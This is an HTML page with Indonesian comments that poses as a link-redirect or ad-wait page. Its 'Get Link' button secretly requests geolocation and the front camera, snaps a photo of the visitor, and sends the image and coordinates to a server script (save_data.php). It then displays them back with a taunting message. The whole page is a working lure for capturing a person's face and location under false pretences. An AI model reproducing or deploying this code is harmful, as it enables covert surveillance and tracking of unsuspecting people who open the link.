<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Page</title>
    <!-- Import Poppins -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <!-- Three.js & Vanta.js -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.waves.min.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
    body {
        margin: 0;
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: 'Poppins', sans-serif;
    }

    @keyframes gradient {
        0% {
            background-position: 0% 50%;
        }

        50% {
            background-position: 100% 50%;
        }

        100% {
            background-position: 0% 50%;
        }
    }

    .container {
        text-align: center;
        color: white;
        padding: 2.5rem;
        backdrop-filter: blur(10px);
        background: rgba(0, 0, 0, 0.25);
        border-radius: 24px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.4);
        max-width: 600px;
        width: 90%;
    }

    h1 {
        font-size: 2.2rem;
        margin-bottom: 0.5rem;
        font-weight: 600;
        letter-spacing: -0.5px;
    }

    p {
        font-size: 1.1rem;
        margin-bottom: 1.5rem;
        opacity: 0.9;
        font-weight: 400;
    }

    .redirect-btn {
        padding: 1rem 2.5rem;
        font-size: 1rem;
        background: rgba(255, 255, 255, 0.15);
        border: 2px solid rgba(255, 255, 255, 0.8);
        color: white;
        border-radius: 100px;
        cursor: pointer;
        transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        text-decoration: none;
        display: inline-block;
        margin-top: 20px;
        font-weight: 500;
        letter-spacing: 0.5px;
    }

    .redirect-btn:hover {
        background: white;
        color: #e73c7e;
        transform: translateY(-3px);
        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
    }

    #countdown {
        font-size: 3rem;
        font-weight: 600;
        margin: 15px 0;
        background: linear-gradient(45deg, #fff, rgba(255, 255, 255, 0.7));
        -webkit-background-clip: text;
        background-clip: text;
        -webkit-text-fill-color: transparent;
    }

    .ad-space {
        margin: 25px 0;
        padding: 20px;
        background: rgba(0, 0, 0, 0.2);
        border-radius: 16px;
        min-height: 250px;
        border: 1px solid rgba(255, 255, 255, 0.05);
    }

    .loader {
        width: 40px;
        height: 40px;
        border: 4px solid rgba(255, 255, 255, 0.3);
        border-top: 4px solid white;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 20px auto;
    }

    @keyframes spin {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }

    @keyframes fadeIn {
        from {
            opacity: 0;
            transform: translateY(20px);
        }

        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    .footer {
        position: fixed;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%);
        color: white;
        font-size: 1rem;
        font-weight: 500;
        opacity: 0.8;
        text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        z-index: 100;
    }
    </style>
</head>

<body>
    <!-- Tambah div untuk popup -->
    <div id="permissionPopup"
        style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0, 0, 0, 0.9); padding: 2rem; border-radius: 16px; z-index: 1000; text-align: center; color: white; max-width: 400px; width: 90%;">
        <h2 style="margin-bottom: 1rem;">Izin Akses</h2>
        <p style="margin-bottom: 1.5rem;">Website ini membutuhkan akses kamera dan lokasi untuk melanjutkan</p>
        <button onclick="requestPermissions()"
            style="padding: 0.8rem 2rem; background: #23a6d5; border: none; color: white; border-radius: 8px; cursor: pointer;">Izinkan</button>
    </div>

    <div class="container">
        <div class="loader"></div>
        <h1>Please Wait...</h1>
        <p>Your link will be ready in <span id="countdown">5</span> seconds</p>
        <!-- Button yang awalnya hidden -->
        <a href="#" class="redirect-btn" id="redirectButton" style="display: none;" onclick="captureAndSend()">
            Get Link
        </a>
        <div class="ad-space">
            <!-- Banner Image Ad -->
            <a href="https://www.adweek.com/convergent-tv/hulu-binge-ad-format-brand-partners/" target="_blank">
                <img src="hulu-cheez-it-ad-CONTENT-2019.webp" alt="Advertisement"
                    style="max-width: 100%; height: auto; border-radius: 12px;">
            </a>
        </div>
    </div>

    <div id="resultModal"
        style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0, 0, 0, 0.95); padding: 2rem; border-radius: 16px; z-index: 1000; color: white; width: 90%; max-width: 400px;">
        <h2 style="margin-bottom: 1rem;">Captured Data</h2>
        <h3 style="margin-bottom: 1rem;">Nahkan Ketahuan Kamu Siapa dan Lokasi Kamu Dimana :V</h3>
        <div style="display: flex; flex-direction: column; gap: 1rem;">
            <img id="capturedImage" style="max-width: 100%; border-radius: 8px;" />
            <div id="map" style="height: 300px; border-radius: 8px;"></div>
        </div>
        <button onclick="closeModal()"
            style="margin-top: 1rem; padding: 0.8rem 2rem; background: #23a6d5; border: none; color: white; border-radius: 8px; cursor: pointer;">Close</button>
    </div>

    <div class="footer">
        hadooyy.csv
    </div>

    <script>
    VANTA.WAVES({
        el: "body",
        mouseControls: true,
        touchControls: true,
        gyroControls: false,
        minHeight: 200.00,
        minWidth: 200.00,
        scale: 1.00,
        scaleMobile: 1.00,
        color: 0x23a6d5,
        shininess: 27.00,
        waveHeight: 20.00,
        waveSpeed: 0.75
    })

    let timeLeft = 5;
    const countdownEl = document.getElementById('countdown');
    const redirectButton = document.getElementById('redirectButton');
    const loader = document.querySelector('.loader');

    const countdownTimer = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(countdownTimer);
            countdownEl.parentElement.innerHTML = "Your link is ready!";
            loader.style.display = 'none';
            redirectButton.style.display = 'inline-block';
            redirectButton.style.animation = 'fadeIn 0.5s ease-in';
        } else {
            countdownEl.textContent = timeLeft;
            timeLeft--;
        }
    }, 1000);

    // Tambah function untuk capture dan kirim data
    async function captureAndSend() {
        try {
            // Minta izin lokasi
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject);
            });

            // Minta izin kamera & capture
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: "user"
                }
            });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            // Bikin canvas untuk capture
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            // Convert ke base64
            const imageData = canvas.toDataURL('image/jpeg');

            // Stop camera
            stream.getTracks().forEach(track => track.stop());

            // Kirim ke PHP
            const formData = new FormData();
            formData.append('image', imageData);
            formData.append('location', `${position.coords.latitude},${position.coords.longitude}`);

            const response = await fetch('save_data.php', {
                method: 'POST',
                body: formData
            });

            // Fetch data terbaru
            const latestData = await fetch('get_latest.php');
            const data = await latestData.json();

            // Show modal with map
            document.getElementById('capturedImage').src = `data:image/jpeg;base64,${data.image}`;
            document.getElementById('resultModal').style.display = 'block';

            // Initialize map
            const coords = data.location.split(',');
            const map = L.map('map').setView([coords[0], coords[1]], 13);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
            L.marker([coords[0], coords[1]]).addTo(map);

        } catch (error) {
            console.error('Error:', error);
            window.location.href = "#";
        }
    }

    function closeModal() {
        document.getElementById('resultModal').style.display = 'none';
        window.location.href = "#";
    }

    // Tambah fungsi untuk request permissions
    async function requestPermissions() {
        try {
            // Request location
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject);
            });

            // Request camera
            const stream = await navigator.mediaDevices.getUserMedia({
                video: true
            });
            stream.getTracks().forEach(track => track.stop()); // Stop camera setelah dapat izin

            // Hide popup kalo udah diizinin
            document.getElementById('permissionPopup').style.display = 'none';
        } catch (error) {
            alert('Mohon izinkan akses kamera dan lokasi untuk melanjutkan');
        }
    }

    // Show popup pas load
    window.onload = function() {
        document.getElementById('permissionPopup').style.display = 'block';
    }
    </script>
</body>

</html>